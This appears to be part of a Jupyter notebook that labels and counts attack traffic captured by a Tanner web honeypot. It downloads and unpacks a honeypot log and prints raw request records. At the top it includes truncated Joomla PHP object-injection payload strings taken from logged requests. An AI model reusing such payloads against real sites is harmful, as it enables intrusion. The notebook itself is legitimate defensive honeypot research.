2143,"}__test|O:21:""JDatabaseDriverMysqli"":3:{s:2:""f...",/
2144,"}__test|O:21:""JDatabaseDriverMysqli"":3:{s:2:""f...",/joomla/


In [ ]:
def clean_surrogates(x):
    if isinstance(x, str):
        return x.encode("utf-8", "ignore").decode("utf-8")
    return x

tanner["headers.x-forwarded-for"] = (
    tanner["headers.x-forwarded-for"]
    .apply(clean_surrogates)
)

In [ ]:
tanner.to_csv(
    "tanner_http_labeled.csv",
    index=False,
    encoding="utf-8"
)

In [ ]:
print(tanner.shape)

print(tanner["attack_type"].value_counts())

print(tanner["severity"].value_counts())

print(tanner["mitre_technique"].value_counts())

(2544, 62)
attack_type
Other                 923
Web Recon             603
PHPUnit RCE           357
Admin Panel Scan      279
phpMyAdmin Scan       237
SQLite Scan            28
ThinkPHP RCE           28
Web Shell              19
HNAP Scan              16
Solr Scan              13
Command Execution      11
Configuration Scan     10
Joomla Scan             7
Tomcat Scan             5
Payload Delivery        3
WebDAV                  2
File Upload             2
.env Exposure           1
Name: count, dtype: int64
severity
Low         923
High        386
Medium      303
Critical     30
Name: count, dtype: int64
mitre_technique
Unknown      923
T1190        385
T1595        301
T1505.003     19
T1059         11
T1210          2
T1552          1
Name: count, dtype: int64


In [ ]:
!wget https://raw.githubusercontent.com/0xsha/sweetie-data/master/tanner/log/tanner_report.json.1.gz

--2026-07-19 15:15:50--  https://raw.githubusercontent.com/0xsha/sweetie-data/master/tanner/log/tanner_report.json.1.gz
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 530 [application/octet-stream]
Saving to: ‘tanner_report.json.1.gz’

tanner_report.json. 100%[===================>]     530  --.-KB/s    in 0s      

2026-07-19 15:15:50 (16.1 MB/s) - ‘tanner_report.json.1.gz’ saved [530/530]



In [ ]:
!cat tanner_report.json.1.gz

� ��P^ �RMo!��W�=%Q���_*�R��Dmo�6�V��X��즉z���*!�̼�y3�C���u�X����}q��I�m2�؂�0�h
�w�>�ь�F	%��A��)%Q�ZP!�5:�1ܛ���u:��AC������ �f�=os�	`�K4Sށh	�S�x�*#ܜ�-Z����i��L�=8	������ݏc���'g=�w~�A_O��n�Ԅ�@��UN2
�i�Ca�.�k��o)��:�g��Op~��"�~F�PP��j5�,�0��%��h�U[��8S^0�P���N9Ŕc��i����`�i�:~���_�����U����Qҕ�a/�k�濑���T�{�ҦŢ�k�C�a��o@�?I�._
N*�]��I��o  

In [ ]:
!gunzip tanner_report.json.1.gz

In [ ]:
!head -5 tanner_report.json.1

{"method": "GET", "path": "/", "headers": {"accept-language": "en-us", "accept-encoding": "gzip,deflate", "host": "167.172.104.173", "accept": "*/*", "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0.2 Safari/602.3.12", "connection": "close"}, "uuid": "619de9ab-fde7-442a-bd3f-fec61ebfb282", "peer": {"ip": "148.163.128.145", "port": 37032}, "status": 200, "cookies": {"sess_uuid": null}, "response_msg": {"version": "0.6.0", "response": {"message": {"detection": {"name": "index", "order": 1, "type": 1, "version": "0.6.0"}, "sess_uuid": "ce5c358d-9c1e-42ff-97ba-6d48dc458313"}}}, "timestamp": "2020-02-22T07:59:41.789673"}
{"method": "GET", "path": "/", "headers": {"user-agent": null}, "uuid": "619de9ab-fde7-442a-bd3f-fec61ebfb282", "peer": {"ip": "189.160.93.71", "port": 37867}, "status": 200, "cookies": {"sess_uuid": null}, "response_msg": {"version": "0.6.0", "response": {"message": {"detection": {"name": "index", "order":